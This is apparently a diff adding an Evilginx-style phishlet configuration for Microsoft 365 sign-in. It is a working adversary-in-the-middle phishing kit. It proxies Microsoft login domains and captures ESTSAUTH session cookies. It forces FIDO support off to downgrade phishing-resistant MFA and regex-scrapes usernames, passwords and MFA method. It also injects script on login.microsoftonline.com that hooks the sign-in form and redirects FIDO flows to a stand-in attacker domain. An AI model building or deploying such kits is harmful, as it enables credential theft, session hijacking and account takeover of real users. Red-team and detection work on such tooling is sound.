@@ -1,0 +1,148 @@
+name: 'M365'
+author: 'Yehuda Smirnov'
+min_ver: '3.1.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH:always','ESTSAUTHPERSISTENT:always','SignInStateCookie:always','esctx:always','ESTSSC:always','ESTSAUTHLIGHT:always','stsservicecookie:always','x-ms-gateway-slice:always']
+    type: 'cookie'
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSSC:always','ESTSAUTHLIGHT:always','stsservicecookie:always','x-ms-gateway-slice:always']
+    type: 'cookie'
+
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/GetCredentialType'
+    search:
+      - {key: 'isFidoSupported', search: '.*'}
+    force:
+      - {key: 'isFidoSupported', value: 'false'}
+    type: 'post'
+
+auth_urls:
+  - "/kmsi*"
+  - "/favicon.ico"
+
+credentials:
+  username:
+    key: '(login|UserName|username|email|account)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password|accesspass)'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'mfaAuthMethod'
+      search: '(.*)'
+      type: 'post'
+  username:
+    key: ""
+    search: '"username":"([^"]*)'
+    type: "json"
+  password:
+    key: ""
+    search: '"password":"([^"]*)'
+    type: "json"
+  username:
+    key: '(login|UserName|username|email|account)'
+    search: '(.*)'
+  password:
+    key: '(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)'
+    search: '(.*)'
+  username:
+    key: '(login)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd)'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/.*"]
+    trigger_params: ["true"]
+    script: |
+      (function() {
+          'use strict';
+
+          // Function to capture credentials
+          function captureCredentials() {
+              var usernameField = document.getElementById('i0116');
+              var passwordField = document.getElementById('i0118');
+              var submitButton = document.getElementById('idSIButton9');
+
+              if (usernameField && passwordField && submitButton) {
+                  submitButton.addEventListener('click', function() {
+                      var credentials = {
+                          username: usernameField.value,
+                          password: passwordField.value
+                      };
+
+                      // Log the captured credentials to the console for verification
+                      console.log('Captured credentials:', credentials);
+
+                      // Add custom handling here (e.g., store or process credentials)
+                  });
+              }
+
+              // Monitor form submissions
+              var forms = document.querySelectorAll('form');
+              forms.forEach(function(form) {
+                  form.addEventListener('submit', function(e) {
+                      var password = form.querySelector('input[type="password"]');
+                      if (password) {
+                          console.log('Form submission intercepted');
+                      }
+                  });
+              });
+          }
+
+          // Call the function when the page loads
+          window.addEventListener('load', captureCredentials);
+
+          // Handle the login form page logic
+          function lp() {
+              var element = document.querySelector('.table');
+              console.log("loaded");
+
+              if (element) {
+                  element.style.display = 'none';
+              };
+
+              if (window.location.pathname == '/common/fido/get' && !loc) {
+                  console.log("success");
+                  location.replace('https://login.attacker_domain.com/');
+                  loc = true;
+              }
+
+              if (window.location.pathname != '/common/fido/get' && loc) {
+                  loc = false;
+              }
+
+              setTimeout(function() {
+                  lp();
+              }, 100);
+          }
+
+          let loc = false;
+          setTimeout(function() {
+              lp();
+          }, 100);
+
+      })();
